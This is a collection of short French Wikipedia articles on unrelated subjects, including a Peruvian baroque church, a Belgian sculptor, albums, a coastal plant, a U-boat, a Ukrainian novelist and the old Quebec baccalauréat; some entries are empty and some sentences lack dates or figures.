Si l'extérieur appartient au style renaissance, l'intérieur, quant à lui, est une formidable démonstration de l'art baroque. Cet art se caractérise par l'exubérance de son ornement, l'exagération du mouvement et la recherche d'effets dramatiques. Il faut s'imaginer les foules indigènes nouvellement converties au christianisme pénétrant dans l'église et ressentant tout le pouvoir visuel de la nouvelle foi à la vue de tant de richesses sculpturales et picturales. 
Le plafond est presque entièrement recouvert d'une décoration de style mudéjar et de motifs floraux. Sur les murs, on peut observer de nombreux tableaux parfaitement intégrés à l'ensemble dans leurs cadres revêtus de feuilles d'or. La plupart sont des œuvres de Luis de Riaño, peintre liménien disciple d'Angelino Medoro né en 1596, plus tard établi à Cuzco où il vivait toujours en 1667. De lui, il nous reste notamment une «Crucifixion», un «Baptême du Christ» et un «Archange Saint Michel». Le tableau de la Vierge du Rosaire qui se trouve dans la chapelle du «Santísimo» a été attribué à Diego Quispe Tito. Il existe également d'autres tableaux anonymes de l'école de Cuzco. 
L'une des curiosités les plus notables de cette église est son baptistère. Sur l'arche qui y mène, on peut observer l'inscription «Je te baptise au nom du Père, du Fils et du Saint-Esprit. Amen.» en latin, en espagnol, en quechua, en aimara et en puquina, témoignage du fait que cette dernière langue aujourd'hui éteinte était autrefois parlée dans la région. 
Mais le plus frappant dans cette église d'Andahuaylillas est sans nul doute la paire de fresques qui se trouvent des deux côtés de la porte d'entrée. Elles représentent les deux voies de l'existence : à gauche, le chemin facile qui conduit à l'enfer ; à droite, le chemin difficile qui mène au paradis. La symbolique simple et presque naïve de ces fresques, en accord avec son caractère didactique, n'amoindrit en rien la puissance expressive de ses images. 
L'église possède aussi les deux orgues les plus anciens connus d'Amérique latine, dont une réplique a été réalisée par Jean-François Dupont pour la fondation K617 à Sarrebourg.
L'église Saint-Pierre-Apôtre d'Andahuaylillas est l'une des étapes de la route du baroque andin qui inclut également l'église de la compagnie de Jésus de Cuzco, l'église Saint-Jean le Baptiste d'Huaro et la chapelle Canincunca d'Urcos. 

</doc>
<doc id="7277422" url="https://fr.wikipedia.org/wiki?curid=7277422" title="Daniel Pletinckx">
Daniel Pletinckx

Daniel Pletinckx, né à Bruxelles, Pays-Bas autrichiens, en 1774 et mort vers 1819, est un sculpteur des Pays-Bas autrichiens, de l'empire français puis néerlandais.
Biographie.
Daniel Pletinckx, né à Bruxelles en 1774, a épousé Jeanne Millot, qui lui donne un fils.
Il est l'élève du sculpteur Godecharle à Bruxelles. En 1808, il obtient le prix de sculpture de l'Académie pour son "Buste du sculpteur François Duquesnoy".
Pletinckx est membre fondateur de la Société de peinture, sculpture et architecture de Bruxelles. Il est également médailleur des Académies de Bruxelles et de Gand.
Il demeurait à Bruxelles rue d'Anderlecht.
Daniel Pletinckx expose au Salon de Gand de 1810 et 1812, au Salon d'Anvers de 1813 et aux Salons de Bruxelles de 1811 à 1818. Il obtient une médaille d'argent au salon de Gand.
Hommage.
La « Rue Pletinckx » dans le centre de Bruxelles perpétue sa mémoire.

</doc>
<doc id="7277423" url="https://fr.wikipedia.org/wiki?curid=7277423" title="Amalia Holst">
Amalia Holst

Amalia Holst, née Amalia von Justi (1758–1829), est une écrivain, intellectuelle et féministe allemande. Son travail met au défi l'éducation traditionnelle et les écrivains du siècle des Lumières tels Jean-Jacques Rousseau. On a considère souvent comme la contrepartie allemande de Mary Wollstonecraft.
Postérité.
Holst est nommée sur le « plancher de l'héritage » de l'installation "The Dinner Party" de l'artiste américaine Judy Chicago.

</doc>
<doc id="7277427" url="https://fr.wikipedia.org/wiki?curid=7277427" title="Here, My Dear">
Here, My Dear

Here, My Dear est le quatorzième album studio du chanteur américain Marvin Gaye sorti en 1978.
L'album.
Marvin Gaye, condamné pour ne pas avoir payé de pension alimentaire à son ex-épouse Anna Gordy, par ailleurs sœur du patron de Tamla Motown Berry Gordy, accepte que les gains de l'album ainsi que l'avance qui lui est faite lui soient reversés. Il écrit alors une série de chansons sur la désintégration de son couple. Gaye, en guerre avec sa maison de disques et avec ses musiciens, sait que l'album sera un fiasco. Il reçoit en effet un accueil très réservé de la critique et du public. Devenu introuvable en magasin les années suivantes, il est finalement entré parmi les 1001 Albums You Must Hear Before You Die.
À l'époque, il divorce avec sa seconde épouse Janis Hunter ; Gaye fait une vague pause avec la musique en partant en Europe en 1979. Il revient un an et demi plus tard en Californie pour terminer les enregistrements de son prochain et dernier album "In Our Lifetime" au sous le label Tamla (Motown avant de signer un contrat avec Colombia Records en 1981.
Liste des titres.
Tous les titres sont de Marvin Gaye (sauf mention) :

</doc>
<doc id="7277440" url="https://fr.wikipedia.org/wiki?curid=7277440" title="Championnat d'Algérie de football de Ligue 2 2010-2011">
Championnat d'Algérie de football de Ligue 2 2010-2011



</doc>
<doc id="7277444" url="https://fr.wikipedia.org/wiki?curid=7277444" title="Halimione portulacoides">
Halimione portulacoides

L'Obione faux-pourpier ou Arroche faux-pourpier, Halimione portulacoides, est une plante de la famille des "Chenopodiaceae" selon la , ou des "Amaranthaceae" selon la classification phylogénétique.
Taxonomie.
L'Obione a été considérée comme une espèce dans un genre à part avant d'être rattachée au genre "Halimione".
Étymologie.
L'Obione tire son nom du fleuve sibérien l'Ob.
Description.
L'obione faux-pourpier est un sous-arbrisseau de 20 à . Les feuilles sont blanc argenté, avec de nombreuses tiges couchées formant des tiges compactes.
La floraison a lieu de juillet à octobre. Les fleurs sont minuscules et d'un blanc-jaunâtre.
Répartition.
C'est une plante présente dans tout le bassin méditerranéen et océanique.
Habitats.
Terrains salés en bordure de mer, milieux arides.
Statuts de protection, menaces.
L'espèce n'est pas considérée comme étant menacée en France. En 2021 elle est classée "Espèce de préoccupation mineure" (LC) par l'UICN.
Toutefois localement l'espèce peut se raréfier : elle est considérée "Quasi menacée" (NT), proche du seuil des espèces menacées ou qui pourrait être menacée si des mesures de conservation spécifiques n'étaient pas prises, dans les régions Picardie et Nord-Pas-de-Calais ; elle est en "Danger-critique" (CR) en Haute-Normandie.
Utilisation.
L'Obione est une plante comestible dont les feuilles au goût salé peuvent être consommées crue en salade, séchées au four à 180 °C (la plante est appelée chips de mer) ou cuisinées en pesto.

</doc>
<doc id="7277445" url="https://fr.wikipedia.org/wiki?curid=7277445" title="Championnat d'Algérie de football de Ligue 2 2012-2013">
Championnat d'Algérie de football de Ligue 2 2012-2013



</doc>
<doc id="7277447" url="https://fr.wikipedia.org/wiki?curid=7277447" title="Atriplex portulacoides">
Atriplex portulacoides



</doc>
<doc id="7277449" url="https://fr.wikipedia.org/wiki?curid=7277449" title="Obione portulacoides">
Obione portulacoides



</doc>
<doc id="7277450" url="https://fr.wikipedia.org/wiki?curid=7277450" title="Saison 2013-2014 de l'Arsenal FC">
Saison 2013-2014 de l'Arsenal FC

La saison 2013-2014 de l'Arsenal FC est la du club en Premier League. En compétition pour le Championnat d'Angleterre, la Coupe d'Angleterre, la Coupe de la Ligue anglaise et la Ligue des champions, Arsenal tente de remporter son premier titre depuis huit saisons.
Équipe première.
Tenues.
Équipementier : NikeSponsor : Emirates
Transferts.
Activité globale.
Dépenses.
Mercato d'été : 50 M€
Mercato d'hiver : 0 €
Total : 50 M€
Gains.
Mercato d'été : 11,6 M€
Mercato d'hiver : 0 €
Total : 11,6 M€
Marge.
Mercato d'été : 38,4 M€
Mercato d'hiver : 0 €
Total : 38,4 M€

</doc>
<doc id="7277451" url="https://fr.wikipedia.org/wiki?curid=7277451" title="Obione faux-pourpier">
Obione faux-pourpier



</doc>
<doc id="7277461" url="https://fr.wikipedia.org/wiki?curid=7277461" title="Coupe Challenge masculine de handball 2013-2014">
Coupe Challenge masculine de handball 2013-2014

La Coupe Challenge masculine de handball 2013-2014 est la de la Coupe Challenge, troisième compétition dans la hiérarchie des compétitions européennes masculines.
La compétition est remportée pour la première fois par le club suédois du IK Sävehof, vainqueur en finale de l'ancien gloire serbe du Metaloplastika Šabac.
Équipes qualifiées.
29 équipes équipes sont qualifiées pour le tour préliminaire :
Trois équipes sont directement qualifiées pour les huitièmes de finale:
Résultats.
Huitièmes de finale.
Le tirage au sort a eu lieu le 5 décembre 2013 à Vienne.
Quarts de finale.
Le tirage au sort a eu lieu le à Vienne (Autriche).
En raison de la situation politique en Ukraine, la rencontre entre Sävehof et Zaporijia s'est déroulée en une manche sèche sur terrain neutre, à Klaipėda, en Lituanie.
Finale.
La finale aller qui devait se dérouler le en Serbie a été annulée pour cause d'inondation. L'EHF a décidé que la finale se jouerait en une manche sèche à Partille (Suède), le .

</doc>
<doc id="7277464" url="https://fr.wikipedia.org/wiki?curid=7277464" title="Stardust (album de Willie Nelson)">
Stardust (album de Willie Nelson)

Stardust est un album de Willie Nelson sorti en 1978.
L'album.
Après le succès de "Red Headed Stranger", Willie Nelson produit un album de reprises de classiques américains. Il bat de nouveau des records de ventes, l'album restant deux ans dans le hit-parade américain. L'album fait partie des 1001 Albums You Must Hear Before You Die et Rolling Stone l'a classé en 2012 à la de son classement des 500 plus grands albums de tous les temps.

</doc>
<doc id="7277471" url="https://fr.wikipedia.org/wiki?curid=7277471" title="Ma Yansong">
Ma Yansong

Yansong Ma (chinois : 马岩松 ; pinyin : Mǎ Yánsōng) est un architecte déconstructiviste chinois, né en 1975 à Pékin, de l'agence MAD Architects qu'il a fondée en 2004.
Parcours.
En 2002, Ma Yansong suit des études d'architecture à Yale, dont il sort titulaire d'un master. Il travaille ensuite à Londres pour Zaha Hadid, puis à New York pour Peter Eisenman. En 2004, il fonde sa propre agence à Pékin : MAD (pour Ma Design). Il obtient ensuite .
Il ouvre deux autres antennes à Tokyo et à Dubaï. 
En 2006, il réalise Hongluo Clubhouse, une villa posée sur l'eau.
En 2009, le projet Hutong Bubble 32 permet d'intégrer un élément futuriste dans une cour traditionnelle de Pékin.
Le musée d'Ordos, situé en Mongolie-Intérieure, au Nord de la Chine, créé par son agence, est inauguré en 2011.
Avec le danois Olafur Eliasson, Ma Yansong réalise "", de Pékin depuis les jeux olympiques qui s'y sont en partie déroulés.
MAD s'illustre notamment par deux buildings aux formes ondulantes, les Absolute World Tower, situés à Mississauga, près de Toronto au Canada surnommées "The Marilyn Monroe Towers", .En , les deux immeubles ont reçu une récompense l'Emporis Skyscraper Award, pour l'année 2012, en raison de leurs formes originales et de l'exploit technique que consiste leur construction. Ma Yansong est devenu .
L'agence d'architecture MAD a conçu en 2012 le premier gratte-ciel du monde en forme d'anneau, le Huzhou Sheraton Resort &amp; Spa à Huzhou près de Shanghai en Chine.
À Harbin, il a créé le China Wood Sculpture Museum et le Harbin Grand Theatre. 
En 2014, à la Biennale de Venise, il présente le projet de Nanjing Zendai Himalaya Center, soit 13 tours bâties au milieu d'une végétation sur . 
Le Pingtan Art Museum est un projet de qui sera un des plus grands musées privés d'Asie, sur l'île de Pingtan ou Haitan (Xian de Pingtan, Fujian). Le projet de 2011 est, apparemment, encore en chantier.
Les 10 tours du Chaoyang Park Plaza à Pékin ont été inaugurées en 2017.
Galerie.
Selon Ma Yansong, les enjeux sur le plan architectural sont de préserver l'environnement et de s'interroger sur l'art de vivre à l'heure des mégalopoles et d'un urbanisme croissant. Il est inspiré par l'Américain Louis Kahn pour son sens de la monumentalité et de l'harmonie formelle. Il déplore que .

</doc>
<doc id="7277477" url="https://fr.wikipedia.org/wiki?curid=7277477" title="08/15 (film)">
08/15 (film)

08/15 est un film dramatique allemand réalisé par Paul May sorti en 1954, d'après le roman de Hans Hellmut Kirst.
Synopsis.
En 1939, avant le début de la Seconde Guerre mondial dans l'Allemagne nazi, le sergent-major Schulz et le chef de peloton Platzek cherchent la moindre chicane à la batterie. Ils ont fait leur bête noire du canonnier Vierbein, qui aime la musique et voudrait être pianiste. Cela devient plus intense lorsque Vierbein est condamné par Schulz à battre les tapis à la caserne et Lore, la femme de Schulz, sensible au sort du jeune garçon, se rapproche de lui. Même le sous-officier Lindenberg ne tarde pas à disputer Vierbein sous la pression de Schulz. Vierbein s'effondre sous tout ce harcèlement. Lorsque Vierbein décide de mettre fin à sa vie alors qu'il amenait les munitions durant l'exercice de tir, son camarade, l'appointé Asch, qui l'accompagnait, décide de le venger. Asch, qui est l'un des meilleurs soldats et est très apprécié par Schulz et Platzek, va faire en sorte d'améliorer la vie des autres soldats. Il met de côté les munitions manquantes et les déclare avec son camarade, l'appointé-chef Kowalski, perdues ; ainsi Platzek, qui est responsable, ne peut expliquer cette perte et a des ennuis.
Asch commence alors avec l'aide de Kowalski à découvrir les fautes de leurs supérieurs et les expose une à une. Lindenberg dénonce l'insubordination d'Asch en prenant à témoin Kowalski qui dément son supérieur. Asch provoque aussi la colère de Rumpler, le cuisinier, lorsqu'il prouve que les rations sont plus petites que ce qu'elles devraient être. Rumpler accuse Asch de mutinerie, amenant Schulz à examiner la cuisine. Platzek tente de dissimuler le manque de munitions et a recours, après l'indication de Kowalski, à Asch. Asch en profite, et lui explique que lui, Platzek, a falsifié le livre des munitions ; Asch le tient ainsi sous sa main. Peu de temps après, Asch et Kowalski décident de lui donner une leçon en mettant les munitions manquantes dans le bureau de Schulz, mais manquent de mettre le feu dans un moment d'inattention.
Entre-temps, les plaintes contre Asch parviennent à Schulz. Schulz, qui a proposé de promouvoir Asch au grade de sergent, ne sait pas quoi faire et transmet le dossier au capitaine Derna. Celui-ci fait appel au médecin militaire, Dr. Sämig, qui déclare Asch psychologiquement irresponsable et donc inapte au combat. Cependant Asch réussit à démasquer le médecin. L'affaire prend une telle proportion qu'elle parvient au commandant du bataillon, le major Luschke. Luschke, agacé par le manque de confiance en soi de Derna, tranche. Il réprimande Lindenberg, fait muter Platzek et Schulz. Il menace Sämig de retirer son habilitation militaire s'il maintient sa plainte contre Asch et renvoie Derna. Kowalski est finalement promu au grade de caporal et Asch à celui de sergent.
Peu de temps après, la guerre éclate et à la fin du film, on voit la batterie défiler alors que Hitler fait sa déclaration de guerre.
Voir aussi.
Articles connexes.
Deux autres épisodes de la série :

</doc>
<doc id="7277479" url="https://fr.wikipedia.org/wiki?curid=7277479" title="L'Humour de droite">
L'Humour de droite

L'Humour de droite, parfois désigné par le sigle HDD, est un collectif créé en juin 2009, composé de trentenaires anonymes travaillant dans la communication et les médias. Ce groupe est actif sur les réseaux sociaux : il anime un forum un profil Facebook, un fil Twitter et un Tumblr spécialisé dans la dérision et le sarcasme sur des sujets politiques et d'actualité. 
"L'Humour de droite" n'est affilié à aucun parti politique, bien que le groupe se soit formé en réaction à la montée de « la droite décomplexée ».
Activité.
Bien que non militants de partis, les membres d'Humour de droite tentent de faire passer des messages au travers de leurs actions sur Internet, notamment contre la stigmatisation des étrangers, des pauvres et des fonctionnaires, ce qui leur a valu des menaces de mort d'après eux, mais ce serait un cas isolé. Leurs tweets donnent régulièrement lieu à des réactions importantes sur le réseau social, récemment par exemple dans le cadre de l'ouverture du mariage civil aux couples de même sexe ou d'un article de "Valeurs actuelles" sur la "droitophobie".
Une des cibles privilégiées du groupe est Benjamin Lancar, d'où le nom du Tumblr « bonjourlancar.tumblr.com ».
Productions.
"L'Humour de droite" a produit divers détournements relayés par la presse, comme l'organigramme UMP, paru dans OWNI, des stickers détournant le logo de l'UMP en remplaçant le nom du parti par LOL, et un plug-in modifiant les noms des dirigeants de l'UMP en ajoutant leur origine, le site web jeprefere.fr permettant le choix entre un don à l'UMP ou un don à des associations , et plus récemment un sac à l'effigie de diverses personnalités de droite, dans un but affiché de troll et de buzz. Le plug-in permettant de modifier les noms des dirigeants n'est cependant pas le seul à avoir été fait, puisque dans le cadre des débats sur le mariage homosexuel en France, un plugin remplaçant les termes père et mère par "parent A" et "parent B" dans les pages web a été proposé au téléchargement.
S'appuyant régulièrement sur sa communauté, "L'Humour de droite" a lancé de nombreuses opérations de « trollage », dont les plus marquantes ont fait les choux gras de la presse en ligne au cours de la campagne présidentielle de 2012.
Élection présidentielle de 2012.
Durant la campagne présidentielle de 2012, "L'Humour de droite" a lancé un concours de détournements de l'affiche de campagne du candidat Sarkozy.
Dans la même période, "L'Humour de droite" a également proposé la revente du programme 2007 de Nicolas Sarkozy sur "Le Bon Coin", recevant de multiples réponses et propositions et a détourné la "timeline" Facebook officielle de Nicolas Sarkozy en lançant une « vraie timeline » mentionnant les multiples oublis de la version officielle, comme son mariage avec Cecilia Sarkozy ou l'invitation de Bachar el-Assad au défilé du .
En outre, "L'Humour de droite" lance une vidéo quelques heures après la victoire de François Hollande, sous forme d'un générique de fin d'un film fictif nommé "Le Quinquennat" ; cette vidéo est corrosive puisqu'elle cite sous des formes légèrement déformées de multiples acteurs d'affaires politico-médiatiques.
Notoriété.
Le groupe d'Humour de droite a rencontré un succès grandissant depuis sa création. Ils ont par ailleurs travaillé de concert avec "Loïc Sécheresse" sur un des blogs de Libération et aussi avec Olivier Laude pour leur tote bag.
Fausse disparition.
Le , le groupe fait disparaître sa page Facebook et son fil Twitter, sans aucune explication. En conséquence, et en l'absence d'explication, la page de Benjamin Lancar se voit très chahutée par les internautes fans de l'Humour de droite. Ce n'est que deux jours plus tard, après beaucoup d'inconnues et d'hypothèses, que l'Humour de droite restaure ses comptes Facebook et Twitter, l'opération ayant visé uniquement à faire parler d'eux.

</doc>
<doc id="7277480" url="https://fr.wikipedia.org/wiki?curid=7277480" title="Akashi Kaijin">
Akashi Kaijin

, né le et mort le , est un poète japonais.
Infecté par la lèpre au début des années 1920, Akashi est dès lors soumis au régime de quarantaine obligatoire en pratique au Japon à cette époque. Il réside au sanatorium "Nagashima Aisei-en" et se fait connaître comme auteur de haiku et waka. Cette situation de quarantaine forcée - les victimes sont strictement isolées et n'ont pas le droit d'avoir des enfants - fait naître d'autres poètes comme Shakusō Shimada, Tamotsu Itō, Tsuda Haruko et Nagata Honami.

</doc>
<doc id="7277495" url="https://fr.wikipedia.org/wiki?curid=7277495" title="La Minerve française">
La Minerve française



</doc>
<doc id="7277510" url="https://fr.wikipedia.org/wiki?curid=7277510" title="Doun Kaev">
Doun Kaev

Doun Kaev est un district situé dans la province de Takeo, dans le sud du Cambodge. Selon le recensement de 1998, la population était de habitants.

</doc>
<doc id="7277513" url="https://fr.wikipedia.org/wiki?curid=7277513" title="Ali Kaya">
Ali Kaya

Ali Kaya (né Stanley Kiprotich Mukche, le à Eldoret au Kenya) est un athlète kényan, naturalisé turc en 2013, spécialiste du fond.
Biographie.
Il s'installe en Turquie en 2010.
Il bat le record national junior du 5 000 m en 13 min 33 s 69 à Bilbao le et remporte le titre du 10 000 m, avec un tour d'avance sur tous ses concurrents, lors des Championnats d'Europe juniors à Rieti le . Deux jours après, il remporte le 5 000 m des mêmes championnats avec une avance comparable sur le frère jumeau de son second sur 10 000 m.
Le , Ali Kaya termine deuxième du Championnat d'Europe de cross-country à Samokov, en Bulgarie.
Le à Mersin, il bat le record de Turquie du 10 000 m en 27 min 24 s 9 lors des championnats nationaux. Le , il remporte le Championnat d'Europe de cross-country disputé à Hyères, en France.

</doc>
<doc id="7277514" url="https://fr.wikipedia.org/wiki?curid=7277514" title="Duon Kaev">
Duon Kaev



</doc>
<doc id="7277516" url="https://fr.wikipedia.org/wiki?curid=7277516" title="Junpei Gomikawa">
Junpei Gomikawa

, né le et décédé le , est un écrivain japonais.
Junpei Gomikawa devient célèbre grâce à son roman "Ningen no jōken" (1958). Le récit épique en six volumes sert de base à la trilogie cinématographique "La Condition de l'homme" (1959-61) de Masaki Kobayashi. Gomikawa écrit également le roman original adapté au cinéma sous le titre "Senso to ningen: Unmei no jokyoku" (1970) de Satsuo Yamamoto. Il est lauréat du prix Kan-Kikuchi en 1978.

</doc>
<doc id="7277524" url="https://fr.wikipedia.org/wiki?curid=7277524" title="Championnat d'Algérie de football de Ligue 2 2011-2012">
Championnat d'Algérie de football de Ligue 2 2011-2012



</doc>
<doc id="7277526" url="https://fr.wikipedia.org/wiki?curid=7277526" title="20 ans d'ecart">
20 ans d'ecart



</doc>
<doc id="7277531" url="https://fr.wikipedia.org/wiki?curid=7277531" title="Bagatelle en si bémol majeur de Beethoven">
Bagatelle en si bémol majeur de Beethoven

La Bagatelle en si bémol majeur WoO 60 est une pièce pour piano composée par Ludwig van Beethoven lors de sa convalescence à Mödling à l’été 1818, parallèlement à la sonate Hammerklavier. Le titre original est “"Klavierstück"” ("pièce pour clavier") et le tempo est noté “"ziemlich lebhaft"” ("assez animé").
Elle a été publiée pour la première fois le dans l’"Allgemeine Musukalische Zeitung" de Berlin, où elle était présentée comme « écrite à la demande l’après-midi du  ». Le destinataire n'est pas nommé mais selon Adolf-Bernhard Marx, un des premiers biographes de Beethoven, il s'agit de la pianiste polonaise Maria Agata Szymanowska.
Une deuxième édition a paru en 1825 dans l’"Harmonicon" de Londres, sous le titre « "Impromptu composed at the Dinner Table" » (« Impromptu composé au dîner »); et quelques années après la mort du compositeur, vers 1840, l’éditeur allemand Heinrich Schlesinger l’a publiée sous le titre fallacieux "Dernière pensée musicale de Louis van Beethoven".
Évoquant l'importance des , Romain Rolland considère cette pièce comme « la plus nuancée de ces Confessions, et la plus remarquable par la finesse hardie de son écriture harmonique. […] C’est une page du Journal intime, dont le sentiment flotte, ambigu, tendre, troublé, entre le doute et la confiance. L’émotion est si instable qu’elle se modifie, au cours d'une phrase. Mais ces changements s’opèrent toujours avec une extrême délicatesse. On dirait des ondes de sentiments — une rougeur, une pâleur — qui passent sous la peau. ».
Durée moyenne d'interprétation : 1 minute.

</doc>
<doc id="7277532" url="https://fr.wikipedia.org/wiki?curid=7277532" title="Noctuelle méditerranéenne">
Noctuelle méditerranéenne



</doc>
<doc id="7277537" url="https://fr.wikipedia.org/wiki?curid=7277537" title="Unterseeboot 139 (1940)">
Unterseeboot 139 (1940)

L' Unterseeboot 139 ou U-139 est un sous-marin allemand (U-Boot) de type II.D utilisé par la Kriegsmarine pendant la Seconde Guerre mondiale.
Comme les sous-marins de type II étaient trop petits pour des missions de combat dans l'océan Atlantique, il a été affecté principalement dans la Mer Baltique.
Présentation.
Mis en service le , l'U-139 a servi comme sous-marin d'entrainement et de navire-école pour les équipages d'abord au sein de la 1. Unterseebootsflottille à Kiel puis à partir du dans la 21. Unterseebootsflottille à Pillau et à partir du dans la 22. Unterseebootsflottille à Gotenhafen.
Le , l'U-139 devient opérationnel toujours dans la 22. Unterseebootsflottille à Gotenhafen.
Il quitte le port de Oxhöft en Pologne le sous les ordres de l'Oberleutnant zur See "Horst Elfe" pour rejoindre 7 jours plus tard Windau en Lettonie. Le lendemain, il reprend la mer pour revenir à Windau le .
Il appareille le du port de Windau pour sa première patrouille toujours sous les ordres de l'Oberleutnant zur See "Horst Elfe" et rejoint Stormelö le , soit après 21 jours.
Sa deuxième patrouille débute le et rejoint, après 4 jours en mer, Gotenhafen le .
Il quitte définitivement le service active le et ne sert plus qu'à la formation des sous-mariniers jusqu'à la fin de la guerre au sein de la 22. Unterseebootsflottille à Gotenhafen.
Le , la fin de la guerre se faisant sentir et pour répondre aux ordres de l'amiral Karl Dönitz pour l'Opération Regenbogen, l'U-139 est sabordé dans la "Raederschleuse" (écluse Raeder (d'après le nom du Grand Amiral Erich Raeder), entrée ouest du port) à Wilhelmshaven, à la position géographique de .
Après guerre, l'U-139 est renfloué et démoli.
Navires coulés.
L'Unterseeboot 139 n'a ni coulé, ni endommagé de navire ennemi au cours des 2 patrouilles (25 jours en mer) qu'il effectua.

</doc>
<doc id="7277540" url="https://fr.wikipedia.org/wiki?curid=7277540" title="Tilde souscrit">
Tilde souscrit

Le tilde souscrit est un signe diacritique de l’alphabet latin. Il a la forme d’un tilde (habituellement placé au-dessus de la lettre qu’il modifie) mais est placé sous la lettre qu’il modifie. Il n’est pas à confondre avec ligne ondulée souscrite.
Utilisation.
Certaines langues du Niger et du Tchad, comme le zarma ou le ngambay, utilisent le tilde souscrit pour marquer les voyelles nasales.
Alphabet phonétique international.
L’alphabet phonétique international utilise le tilde souscrit pour indiquer le mode d’articulation laryngealisée, par exemple .
Codage.
Le tilde souscrit est codé dans le codage Unicode à l’aide du caractère (codice_1 ◌̰) combinable avec la lettre qui le précède.

</doc>
<doc id="7277541" url="https://fr.wikipedia.org/wiki?curid=7277541" title="Ɛ̰">
Ɛ̰

Ɛ̰ (minuscule : ɛ̰), appelé epsilon tilde souscrit, est un graphème utilisé dans l’écriture du mbelime et du nateni.
Il s’agit de la lettre epsilon diacritée d’un tilde souscrit.
Représentations informatiques.
L’epsilon tilde souscrit peut être représenté avec les caractères Unicode suivants :

</doc>
<doc id="7277544" url="https://fr.wikipedia.org/wiki?curid=7277544" title="Scott Matthews">
Scott Matthews

Scott Matthews, né en 1976 à Wolverhampton en Angleterre, est un auteur-compositeur-interprète qui connait la consécration grâce à son album "Passing Stranger".
Biographie.
Scott Matthews sort son premier album, "Passing Stranger", le sur le label San Remo Records, avant de le ré-éditer chez Island Records dans le courant de l'année.
Janice Long, présentatrice radio à la BBC est la première à programmer ses chansons. Elle est bientôt suivie par les autres chaines de la BBC comme BBC Radio 2, par le biais des présentateurs vedettes Mark Radcliffe et Bob Harris.
Dès avril, Scott se produit sur les deux stations BBC Radio 2 et BBC 6 Music.
Le premier single de l'album, "Elusive", est édité en septembre. Le titre bénéficie d'une large couverture médiatique, entendu dans les émissions des présentateurs Jo Whiley, Dermot O'Leary ou Zane Lowe. Du 7 au , Zane Lowe programme le titre chaque soir comme « chanson favorite de la semaine ».
Entre mai et août, Scott se rend aussi aux studios pour y interpréter "Elusive" ainsi que les autres titres de l'album.
Il remporte l'Ivor Novello Awards en dans la catégorie « Meilleure Chanson musique et texte » pour "Elusive".
Parmi ses nombreuses sources d'inspiration, Scott Matthews reconnait les Beatles, Bob Dylan, Led Zeppelin, Joni Mitchell, Marc Bolan et Joe Satriani.
Il assure la promotion de son album en effectuant une tournée dans l'ensemble des salles anglaises. Il fait aussi la première partie des concerts du groupe Foo Fighters, à l'occasion de la promotion de leur album acoustique, "Skin and Bones", en .
Le deuxième album de Scott Matthews, "Elsewhere", est produit en collaboration avec Gavin Monaghan et publié par Island Records.
Son troisième album, "What the Night Delivers", est produit par Jon Cotton, producteur du premier album "Passing Stranger".

</doc>
<doc id="7277549" url="https://fr.wikipedia.org/wiki?curid=7277549" title="Olha Kobylianska">
Olha Kobylianska

Olha Kobylianska, en , est une romancière et féministe ukrainienne et soviétique née le en Gura Humorului, Bucovine et morte le à Tchernivtsi.
Biographie.
Olha Kobylianska est née le à Gura Humora en Duché de Bucovine dans la famille d'un travailleur ukrainien de l'administration minière. Elle est le quatrième des sept enfants de Maria Werner et Yulian Kobyliansky. Principalement autodidacte, Kobylianska n'a reçu qu'une courte éducation de quatre ans entièrement en allemand, ce qui peut expliquer le fait que son premier roman, publié en 1880, soit écrit dans cette langue. Ce n'est qu'en 1894 que paraîtra son premier ouvrage en ukrainien, notamment sous l'influence de compatriotes féministes comme Sofia Okounevska, Natalia Kobrynska ou encore Lessia Oukraïnka. Kobylianska a rencontré cette dernière en 1899, tandis qu'au fil du temps leur rapprochement et leur correspondance sont devenus de plus en plus intenses jusqu'à prendre une teinte passionnée. Même si cette "passion" peut paraître surprenante dans la vie culturelle ukrainienne encore très conservatrice, de telles relations pouvaient être fréquentes dans les avant-gardes européennes. En 1894, Kobylianska a participé à la fondation de la société des femmes de Ruthénie qui n'a toutefois pas réussi à recruter un grand nombre de femmes, beaucoup étant attirées par le socialisme radical et révolutionnaire. Kobylianska a soutenu la révolution bolchevique de 1917 mais aussi l'annexion de l'Ukraine par l'URSS, un soutien qui lui a valu des ennuis lorsque les Allemands et les Italiens ont envahi la Bucovine en 1941. Sa mort en 1942 l'a soustraite aux conséquences d'un procès en cour martiale.
Vie privée.
Dans les années 1890, elle avait entretenu une relation amoureuse avec le critique littéraire Osyp Makovei, qui défendait les œuvres de Kobylianska et se sentait à l'aise avec le thème des personnages féminins forts, indépendants et instruits qui affirmaient leur droit à l'épanouissement sexuel. Cependant, ils se séparèrent plus tard et, en 1901, Kobylians'ka rencontra une écrivaine Lessia Oukraїnka (1871-1913). Cette rencontre a donné lieu à une union extrêmement passionnée qui s'est concrétisée par correspondance car la maladie et les circonstances les empêchaient de vivre ensemble. Le critique littéraire Ihor Kostetsky a plus tard suggéré que leur relation était lesbienne, alors que George S. N. Luckyj estimait que: "Il y avait probablement peu ou pas de contacts physiques entre les deux femmes, bien que le langage de leurs lettres semble homo-érotique".
Style.
Kobylianska est devenue une des les plus reconnues de son époque, même si certains de ses livres ont pu choquer la société du par leur approche plus libre de la sexualité féminine, et plus largement de la condition féminine dans son ensemble. Ses livres se sont aussi intéressés à la paysannerie et au lien entre la nature et les Hommes. Toute son œuvre est plus ou moins influencée par Nietzsche, George Sand et par de nombreux auteurs allemands, tout particulièrement les romantiques. Solomiia Pavlychko a noté les forts motifs homoérotiques trouvés dans les travaux publiés de Kobylianska, notamment "la Valse mélancolique".
Hommages.
Le théâtre de Tchenivtsi et le musée Olha Kobylianska de Tchenivtsi sont à son nom.

</doc>
<doc id="7277554" url="https://fr.wikipedia.org/wiki?curid=7277554" title="Baccalauréat ès arts (Québec)">
Baccalauréat ès arts (Québec)

Le baccalauréat ès arts (B.A.) est, avant 1969, un diplôme sanctionnant le cours classique et donnant accès aux études universitaires au Canada français, principalement au Québec mais aussi en Ontario, en Acadie et au Manitoba. Il était attribué par l'Université Laval et l'Université de Montréal aux finissants des collèges classiques affiliés à l'une ou l'autre de ces universités et qui réussissaient les examens imposés par leur faculté des arts. Ce n'était donc pas un baccalauréat universitaire proprement dit. Ce système d'affiliation entre les collèges et les universités a été mis en place dès 1879.
Les Jésuites, qui possédaient leurs propres collèges, avaient le privilège de dispenser leurs propres examens et de simplement transmettre aux universités la liste des élèves acceptés.
Transition vers le diplôme d'études collégiales.
